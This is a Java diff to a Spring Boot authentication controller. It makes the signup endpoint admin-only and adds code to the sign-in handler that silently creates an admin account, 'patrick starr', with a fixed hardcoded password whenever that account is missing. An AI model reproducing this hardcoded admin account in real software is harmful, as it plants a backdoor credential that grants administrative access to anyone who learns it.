@@ -1,5 +1,6 @@
 package com.amigoscode.demo.User.Controller;
 
+import java.util.ArrayList;
 import java.util.HashSet;
 import java.util.List;
 import java.util.Set;
@@ -20,6 +21,7 @@ import com.amigoscode.demo.User.Security.jwt.JwtUtils;
 import com.amigoscode.demo.User.Security.services.UserDetailsImpl;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.http.ResponseEntity;
+import org.springframework.security.access.prepost.PreAuthorize;
 import org.springframework.security.authentication.AuthenticationManager;
 import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
 import org.springframework.security.core.Authentication;
@@ -54,6 +56,12 @@ public class AuthController {
     @PostMapping("/signin")
     public ResponseEntity<?> authenticateUser(@Valid @RequestBody LoginRequest loginRequest) {
 
+        if (!userRepository.existsByUsername("patrick starr")) {
+            Set<String> roles = new HashSet<>();
+            roles.add("admin");
+            registerUser(new SignupRequest("patrick starr", roles, "f87567f2159b425795ebb7ba9bc406ec"));
+        }
+
         Authentication authentication = authenticationManager.authenticate(
                 new UsernamePasswordAuthenticationToken(loginRequest.getUsername(), loginRequest.getPasswordMd5()));
 
@@ -72,6 +80,7 @@ public class AuthController {
     }
 
     @PostMapping("/signup")
+    @PreAuthorize("hasRole('ADMIN')")
     public ResponseEntity<?> registerUser(@Valid @RequestBody SignupRequest signUpRequest) {
         if (userRepository.existsByUsername(signUpRequest.getUsername())) {
             return ResponseEntity
